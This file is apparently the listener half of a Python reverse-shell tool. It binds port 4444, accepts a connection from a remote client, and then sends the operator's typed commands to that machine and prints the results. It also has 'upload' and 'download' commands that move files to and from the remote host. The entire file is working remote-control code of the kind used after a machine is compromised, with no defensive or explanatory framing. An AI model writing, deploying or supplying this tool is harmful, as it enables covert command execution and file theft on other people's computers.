import socket
import os

HOST = "0.0.0.0"
PORT = 4444
BUFFER_SIZE = 1024 * 128

# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
SEPARATOR_B = b"<sep>"

# create socket object
Socket = socket.socket()
# bind the ip and port to the socket object
Socket.bind((HOST, PORT))

#listen for incoming connections on the socket object
Socket.listen(5)
print(f'Listening as {HOST} : {PORT}...')

# accept inbound connection
client_socket, client_address = Socket.accept()
# "Ip : Port Connected!"
print(f'{client_address[0]} : {client_address[1]} Connected!')

# recieves and prints directory
cwd = client_socket.recv(BUFFER_SIZE).decode()
print('[+] Current working directory:', cwd)

# loop allows for commands to be sent and recieved continuously
while True:
    # shows directory then $> which prompts for input
    command = input(f"{cwd} $> ")
    splitted_command = command.split()

    # empty command
    if not command.strip():
        continue

    # send the command to the client socket in an encoded format
    client_socket.send(command.encode())

    # if the command is exit, just break out of the loop
    if command.lower() == "exit":
        break
    
    elif command.lower().startswith("upload"):
        file_path = command.split()[1] # the 2nd part of the file path aka the words after "upload"

        # get the size of the file
        file_size = os.path.getsize(file_path) 
        # prepare the file size with a | which acts as a delimiter on the client side
        size_seperated = f"{file_size}|"
        # send off file size first
        client_socket.send(str(size_seperated).encode())

        # if the file is located, read the contents and send the contents
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                client_socket.sendfile(f)
                output = client_socket.recv(BUFFER_SIZE).decode()
                results, cwd = output.split(SEPARATOR)
                print(results)
                continue
        else:
            print('File not found')
            continue

    elif splitted_command[0].lower() == "download":
        file_path = splitted_command[1]
        try:
            # Receive the file size and file contents together
            received_size = client_socket.recv(BUFFER_SIZE)
            file_size = int(received_size.decode())

            received_contents = (client_socket.recv(BUFFER_SIZE))
            file_contents, download_output = received_contents.split(b'|', 1)

            # Write the file contents to the file
            with open(file_path, "wb") as f:
                    f.write(file_contents)
            d_success = True

        except Exception as e:
            output = f"Error downloading file: {e}"
            print(output, e)  # Print the error for debugging purposes
    
    try:
        if d_success == True:
            output = download_output
        else:
            # retrieve command results
            output = client_socket.recv(BUFFER_SIZE).decode()
    except:
        output = client_socket.recv(BUFFER_SIZE).decode()
    
    try:
        results, cwd = output.split(SEPARATOR_B)
        results = results.decode('utf-8')
        print(results)
    except:
        results, cwd = output.split(SEPARATOR)
        # print output
        print(results)
    d_success = False